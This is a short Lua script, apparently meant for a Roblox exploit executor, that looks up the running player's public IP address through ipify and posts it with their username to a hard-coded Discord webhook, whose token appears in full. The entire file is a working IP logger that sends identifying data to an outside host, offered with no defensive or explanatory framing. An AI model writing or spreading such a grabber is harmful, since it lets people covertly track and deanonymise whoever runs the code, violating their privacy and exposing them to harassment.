local webhookURL = "https://discord.com/api/webhooks/1496967185250259034/lpGzqOguKlJH_1Mjm7iUQhAVgjbz7qP61LVKtguBgaaf0wEWJk2STYXWXn_CfYKMKHUO"

local function getIP()
    local response = request({
        Url = "https://api.ipify.org?format=json",
        Method = "GET"
    })
    return game:GetService("HttpService"):JSONDecode(response.Body).ip
end

local success, err = pcall(function()
    local ip = getIP()
    local username = game:GetService("Players").LocalPlayer.Name

    request({
        Url = webhookURL,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = game:GetService("HttpService"):JSONEncode({ content = username .. " : " .. ip })
    })
end)

if not success then
    print("Error: " .. tostring(err))
end
